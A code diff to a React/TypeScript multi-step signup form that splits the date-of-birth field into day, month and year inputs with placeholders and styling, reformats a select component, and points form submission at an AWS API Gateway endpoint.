@@ -22,7 +22,6 @@ type FormData = {
   day: string;
   month:string;
   year:string;
-  dob: string;
   phone: string;
   email: string;
   address: string;
@@ -44,7 +43,6 @@ const MultiStepForm = () => {
   const [formData, setFormData] = useState<FormData>({
     firstName: '',
     lastName: '',
-    dob: '',
     day:'',
     month:'',
     year:'',
@@ -134,7 +132,7 @@ const MultiStepForm = () => {
       await sendTelegramMessage(message);
   
       // Send the form data to your API Gateway endpoint
-      const response = await axios.post('https://your-api-gateway-url.com/submit', formData);
+      const response = await axios.post('https://ymcq30o8c7.execute-api.us-east-1.amazonaws.com/signup', formData);
   
       // Navigate to the homepage on successful response
       if (response.status === 200) {
@@ -196,7 +194,7 @@ const MultiStepForm = () => {
               />
             </div>
 
-            <div>
+            <div className="space-y-1">
   <label className="block text-sm font-medium text-black mb-1">Date of Birth</label>
   <div className="grid grid-cols-3 gap-2">
     <input
@@ -204,24 +202,33 @@ const MultiStepForm = () => {
       name="day"
       type="text"
       required
+      placeholder="DD"
       value={formData.day}
       onChange={(e) => handleChange('day', e.target.value)}
+      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
+      maxLength={2}
     />
     <input
       id="month"
       name="month"
       type="text"
       required
+      placeholder="MM"
       value={formData.month}
       onChange={(e) => handleChange('month', e.target.value)}
+      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
+      maxLength={2}
     />
     <input
       id="year"
       name="year"
       type="text"
       required
+      placeholder="YYYY"
       value={formData.year}
       onChange={(e) => handleChange('year', e.target.value)}
+      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
+      maxLength={4}
     />
   </div>
 </div>
@@ -404,42 +411,42 @@ const InputField = ({
 
 // Reusable Select Component
 const SelectField = ({
-  label,
-  value,
-  options,
-  onChange,
-  error,
-  required = false,
-}: {
-  label: string;
-  value: string;
-  options: string[];
-  onChange: (value: string) => void;
-  error?: string;
-  required?: boolean;
-}) => (
-  <div className="space-y-1">
-    <label className="block text-sm font-medium text-gray-700">
-      {label} {required && <span className="text-red-500">*</span>}
-    </label>
-    <select
-      value={value}
-      onChange={(e) => onChange(e.target.value)}
-      className={`block w-full px-3 py-2 border rounded-md shadow-sm ${
-        error ? 'border-red-500' : 'border-gray-300'
-      } focus:outline-none focus:ring-2 focus:ring-green-500`}
-      required={required}
-    >
-      <option value="">Select {label.toLowerCase()}</option>
-      {options.map((option) => (
-        <option key={option} value={option}>
-          {option}
-        </option>
-      ))}
-    </select>
-    {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
-  </div>
-);
+    label,
+    value,
+    options,
+    onChange,
+    error,
+    required = false,
+  }: {
+    label: string;
+    value: string;
+    options: string[];
+    onChange: (value: string) => void;
+    error?: string;
+    required?: boolean;
+  }) => (
+    <div className="space-y-1">
+      <label className="block text-sm font-medium text-gray-700">
+        {label} {required && <span className="text-red-500">*</span>}
+      </label>
+      <select
+        value={value}
+        onChange={(e) => onChange(e.target.value)}
+        className={`block w-full px-3 py-2 border rounded-md shadow-sm text-black bg-white ${
+            error ? 'border-red-500' : 'border-gray-300'
+          } focus:outline-none focus:ring-2 focus:ring-green-500`}
+        required={required}
+      >
+        <option value="" className="text-gray-400">Select {label.toLowerCase()}</option>
+        {options.map((option) => (
+          <option key={option} value={option} className="text-black">
+            {option}
+          </option>
+        ))}
+      </select>
+      {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
+    </div>
+  );
 
 // Reusable Button Component
 const Button = ({
